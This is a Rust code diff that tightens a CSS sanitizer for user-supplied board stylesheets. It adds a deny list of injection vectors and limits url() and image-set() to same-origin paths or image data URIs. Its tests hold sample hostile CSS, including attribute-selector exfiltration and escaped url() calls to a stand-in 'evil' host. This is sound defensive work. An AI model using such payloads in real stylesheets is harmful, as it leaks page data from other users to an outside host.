@@ -257,16 +257,52 @@ impl<'a> PageContext<'a> {
     }
 }
 
+/// Board custom CSS is shown to every viewer of the board, so it must not be able to load
+/// external resources (attribute-selector exfiltration) or hide payloads behind CSS escapes.
+/// Anything suspicious drops the whole stylesheet.
 fn sanitize_css(raw: &str) -> String {
     let lower = raw.to_ascii_lowercase();
-    if lower.contains("</style")
-        || lower.contains("<script")
-        || lower.contains("javascript:")
-        || lower.contains("expression(")
-    {
+    const FORBIDDEN: [&str; 8] = [
+        "\\",
+        "@import",
+        "expression(",
+        "behavior:",
+        "-moz-binding",
+        "javascript:",
+        "</style",
+        "<script",
+    ];
+    if FORBIDDEN.iter().any(|f| lower.contains(f)) {
         return String::new();
     }
+    for func in ["url(", "image-set(", "image("] {
+        let mut rest = lower.as_str();
+        while let Some(pos) = rest.find(func) {
+            let after = &rest[pos + func.len()..];
+            let inner = after.split(')').next().unwrap_or("");
+            let ok = if func == "image-set(" {
+                // Nested url() calls are checked on their own; bare strings are checked here.
+                inner
+                    .split(',')
+                    .map(str::trim)
+                    .filter(|part| !part.contains("url("))
+                    .all(|part| css_arg_allowed(part.split_whitespace().next().unwrap_or("")))
+            } else {
+                css_arg_allowed(inner)
+            };
+            if !ok {
+                return String::new();
+            }
+            rest = after;
+        }
+    }
     raw.to_string()
+}
+
+/// A CSS resource argument is allowed when it is a same-origin path or an image data URI.
+fn css_arg_allowed(arg: &str) -> bool {
+    let arg = arg.trim().trim_matches(|c| c == '"' || c == '\'').trim();
+    (arg.starts_with('/') && !arg.starts_with("//")) || arg.starts_with("data:image/")
 }
 
 fn sanitize_hex_color(raw: Option<&str>) -> Option<String> {
@@ -652,5 +688,32 @@ mod tests {
         assert!(!out.contains("</script><script>alert"));
         assert!(out.contains(r#"<script type="application/json" id="homarr-spotlight-data">"#));
         assert!(out.contains("<main class=\"main-container\"><p>ok</p></main>"));
+    }
+
+    #[test]
+    fn sanitize_css_rejects_exfiltration_and_escapes() {
+        for bad in [
+            "@import url(https://x)",
+            "input[value^=a]{background:url(//evil/a)}",
+            "a{background:url(https://evil)}",
+            "a{background:u\\72l(https://evil)}",
+            "a{background:image-set(\"//evil/a.png\" 1x)}",
+            "a{background:URL( 'http://evil' )}",
+            "a{behavior:url(/x.htc)}",
+        ] {
+            assert_eq!(sanitize_css(bad), "", "{bad}");
+        }
+    }
+
+    #[test]
+    fn sanitize_css_keeps_local_urls_and_normal_rules() {
+        for ok in [
+            "a{background:url(/images/bg.png)}",
+            "a{background:url(\"data:image/png;base64,AAAA\")}",
+            "a{background:image-set(\"/a.png\" 1x, url(/b.png) 2x)}",
+            ".x{color:red;margin:0 auto}",
+        ] {
+            assert_eq!(sanitize_css(ok), ok);
+        }
     }
 }
